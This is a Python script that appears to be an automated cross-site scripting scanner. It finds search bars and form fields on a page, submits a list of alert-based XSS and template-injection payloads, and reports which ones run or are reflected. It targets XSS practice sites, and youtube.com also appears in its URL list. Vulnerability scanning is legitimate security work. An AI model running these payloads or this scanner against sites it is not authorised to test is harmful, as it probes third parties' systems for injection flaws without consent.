from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException, ElementNotInteractableException
import time
from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.webdriver.support.expected_conditions import alert_is_present
from bs4 import BeautifulSoup
import requests
from urllib.parse import urljoin


def find_search_bar(browser, url, method=None):
    browser.get(url)
    try_methods = [
        ("css_selector", "input[type='text']"),
        ("name", "q"),
        ("name", "email"),
        ("id", "search-bar"),
        ("css_selector", "input[type='search']"),
        ("css_selector", "input[type='text'][placeholder='Filter results']"),
        ("css_selector", "textarea.form-control#inp[placeholder='type here']")
    ]
    if method:
        try_methods = method

    found_search_bar = try_methods_for_search_bar(browser, try_methods)
    if found_search_bar[0]:
        return found_search_bar

    browser.switch_to.default_content()
    frames = browser.find_elements(By.TAG_NAME, "iframe") + browser.find_elements(By.TAG_NAME, "frame")

    for frame in frames:
        try:
            browser.switch_to.frame(frame)
            found_search_bar = try_methods_for_search_bar(browser, try_methods)
            if found_search_bar and found_search_bar[0]:
                return found_search_bar
        except Exception as e:
            print(f"Error switching to frame: {e}")
        finally:
            browser.switch_to.default_content()

    print("Search bar not found in any frame or the main content.")
    return [None, None, None]


def try_methods_for_search_bar(browser, try_methods):
    for method, value in try_methods:
        search_bar = try_find_search_bar(browser, method, value)
        if search_bar[0]:
            return search_bar
    return [None, None, None]


def try_find_search_bar(browser, method, value):
    try:
        search_bar = WebDriverWait(browser, 15).until(
            EC.presence_of_element_located((getattr(By, method.upper()), value))
        )
        try:
            search_bar.send_keys("Test")
            search_bar.clear()
            return [search_bar, method, value]
        except ElementNotInteractableException:
            return [None, None, None]
    except (NoSuchElementException, TimeoutException):
        return [None, None, None]


def analyze_response(browser, payload):
    try:
        # Wait up to 5 seconds for an alert to appear
        WebDriverWait(browser, 5).until(alert_is_present())
        alert = browser.switch_to.alert
        alert_text = alert.text
        alert.accept()  # Dismiss the alert
        return True, f"Alert triggered with text: {alert_text}, payload: {payload}"

    except TimeoutException:
        # No alert was triggered within 5 seconds
        pass
    except UnexpectedAlertPresentException as e:
        # If there is any other issue with the alert
        print(f"Unexpected alert present: {e}")
        alert = browser.switch_to.alert
        alert.accept()
        return True, f"Handled unexpected alert with text: {alert.text}, payload: {payload}"

    except Exception as e:
        print(f"Error during response analysis: {e}")
        return False, "Error handling response."

    # Additional checks for XSS can go here, as needed
    return False, "No clear vulnerability detected based on response."


def test_xss_payloads(browser, search_bar):
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '"><img src="invalid" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS");',
        '<svg/onload=alert("XSS")>',
        '" onfocus="alert(\'XSS\')" autofocus="',
        '<body onload=alert("XSS")>',
        '{{constructor.constructor("alert(\'XSS\')")()}}',
        '{{7*7}}<img src="x" onerror="alert(1)">'
    ]

    results = []
    found = False

    for payload in xss_payloads:
        try:
            search_bar.clear()
            search_bar.send_keys(payload + Keys.ENTER)
            time.sleep(5)  # Allow page to load and script to execute if any
            vulnerable, result_message = analyze_response(browser, payload)
            results.append((payload, result_message))
            if vulnerable:
                found = True
            browser.back()
            time.sleep(2)
        except Exception as e:
            results.append((payload, str(e)))

    return results, found


def check_xss_in_searchbar(url):
    options = Options()
    browser = webdriver.Chrome(options=options)

    try:
        search_bar = find_search_bar(browser, url, None)[0]
        if search_bar:
            results, found = test_xss_payloads(browser, search_bar)
            if found:
                print("XSS vulnerability detected")
            else:
                print("No XSS vulnerability detected.")
        else:
            print("Search bar not found.")
    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")
    finally:
        browser.quit()


def find_input_fields(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.find_all(['input', 'textarea', 'form'])


def input_field_details(form):
    details = {
        "action": form.attrs.get("action", "#"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for input in form.find_all(['input', 'textarea']):
        input_details = {
            "type": input.attrs.get("type", "text"),
            "name": input.attrs.get("name", ""),
            "value": input.attrs.get("value", "")
        }
        details["inputs"].append(input_details)
    return details


def test_xss_injection(base_url, form, session):
    action = urljoin(base_url, form['action'])
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '" onfocus="alert(\'XSS\')" autofocus="',
        'javascript:alert("XSS");'
    ]
    data = {}
    for input in form['inputs']:
        for payload in xss_payloads:
            data[input['name']] = payload
            if form['method'] == 'post':
                response = session.post(action, data=data)
            else:
                response = session.get(action, params=data)
            if payload in response.text:
                return True
    return False


def scan_xss_vulnerability(url):
    session = requests.Session()
    try:
        response = session.get(url)
        forms = find_input_fields(response.text)
        for form in forms:
            form_info = input_field_details(form)
            if test_xss_injection(url, form_info, session):
                print(f"XSS vulnerability detected")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching the URL: {e}")


if __name__ == '__main__':
    url = ["https://xss-quiz.int21h.jp", "http://sudo.co.il/xss/level4.php",
           "https://www.youtube.com"]  # Replace with the actual URL
    scan_xss_vulnerability(url[1])
    check_xss_in_searchbar(url[1])
